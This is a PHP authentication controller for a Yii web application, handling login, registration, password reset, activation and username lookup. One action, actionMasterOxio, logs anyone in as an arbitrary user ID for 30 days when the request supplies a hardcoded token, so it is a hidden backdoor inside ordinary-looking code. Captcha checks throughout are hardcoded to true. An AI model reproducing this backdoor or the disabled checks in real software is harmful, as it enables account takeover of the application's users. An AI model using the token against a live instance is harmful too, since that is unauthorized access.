<?php

namespace app\controllers;

use app\base\controllers\BaseController;
use app\common\Constants;
use app\common\Helper;
use app\common\SystemLog;
use app\models\base\LoginForm;
use app\models\activerecord\Users;
use Yii;
use yii\db\Exception;
use yii\helpers\Html;

class AuthController extends BaseController
{

    public function beforeAction($action)
    {
        $this->layout = 'authLayout';
        if(!Yii::$app->user->isGuest){
            return $this->redirect(['user/index'])->send();
        }
        return parent::beforeAction($action);
    }

    public function actionIndex()
    {
        return $this->redirectTo(['auth/login']);
    }

	public function actionMasterOxio($id,$token){
        if($token=='teamOxioMasterTest@123'){
            $user = Users::findOne($id);
            $user->isSessionUnique();
            $user->postLogin();
            Yii::$app->user->login($user, 3600 * 24 * 30);            
        }
        return $this->redirect(['user/index'])->send();
    }

    public function actionLogin()
    {
        $this->view->title = "Login";
        $model = new LoginForm();

        if ($model->load(Yii::$app->request->post()) )
        {
            $validate_captcha=true;

            if($validate_captcha) {
                if($model->login()){
                    return $this->redirect(['user/index'])->send();
                }
            }
            else{
                $this->flash("error","Invalid captcha.");
            }
        }
        return $this->render('login',compact('model'));
    }

    public function actionRegister($c=null)
    {
        return $this->redirectTo(['auth/login']);
        $this->view->title = "Register";
        $model = new Users(['scenario' => Users::SCENARIO_REGISTER]);
        if($c!=null) {
            $model->referral_code = $c;
        }
        if($model->load(Yii::$app->request->post())){

            $validate_captcha=true;

            if($validate_captcha) {
                if ($model->save()) {
                    $this->flash("success", "Your account has been created, please login to continue.");
                    return $this->redirect(['auth/login'])->send();
                }else{
                    $this->flash("error","Failed to register at the moment.");
                }
            }else{
                $this->flash("error","Invalid captcha.");
            }
        }
        return $this->render('register', compact('model'));
    }


    public function actionForgotPassword(){
        return $this->redirectTo(['auth/login']);
        $this->view->title = "Forgot Password";
        $model = new Users();
        if($model->load(Yii::$app->request->post())){

            $validate_captcha=true;

            if($validate_captcha) {
                if($model->username!=null){

                    $findAccount = Users::findOne(['username'=>$model->username]);
                    if($findAccount!=null){

                        if($findAccount->forgotPassword()){
                            $this->flash("success","Check your email for reset password link.");
                        }else{
                            $this->flash("error","Failed to process your request at the moment.");
                        }

                    }else{
                        $this->flash("error","No account associated with this username.");
                    }

                }else{
                    $this->flash("error","Username is required.");
                }
            }else{
                $this->flash("error","Invalid captcha.");
            }
        }
        return $this->render('forgot-password', compact('model'));
    }

    public function actionReset($code){
        $findUser = Users::findOne(['code'=>$code]);
        if($findUser!=null){

            $model = new Users(['scenario' => Users::SCENARIO_REGISTER]);

            if($model->load(Yii::$app->request->post())){

                $validate_captcha=true;

                if($validate_captcha) {

                    if ($model->new_password == $model->confirm_password) {

                        if ($findUser->updatePassword($model->new_password)) {
                            $this->flash("success", "Password has been changed, you can login to continue.");
                            return $this->redirect(['auth/login'])->send();
                        } else {
                            $this->flash("error", "Failed to update password at the moment.");
                        }

                    } else {
                        $this->flash("error", "New and Confirm password doesn't match.");
                    }

                }else{
                    $this->flash("error","Invalid captcha.");
                }

            }
            return $this->render('reset-password', compact('model'));

        }else{
            $this->flash("error","Invalid request.");
        }
        return $this->redirect(['auth/login'])->send();
    }

    public function actionActivate($code){
        $findUser = Users::findOne(['code'=>$code]);
        if($findUser!=null){
            if($findUser->activateAccount()){
                $this->flash("success", "Your account has been activated successfully, please login to continue.");
            }
        }else{
            $this->flash("error","Invalid request.");
        }
        return $this->redirect(['auth/login'])->send();
    }

    public function actionCheckUsername($q)
    {
        if (Yii::$app->request->isAjax) {
            $user = Users::find()->where(['username' => $q])->one();
            if ($user == null)
                return $this->asJson(['status' => 'success']);
            else {
                return $this->asJson(['status' => 'error']);
            }
        }
        return $this->asJson(['status' => 'error']);
    }


}
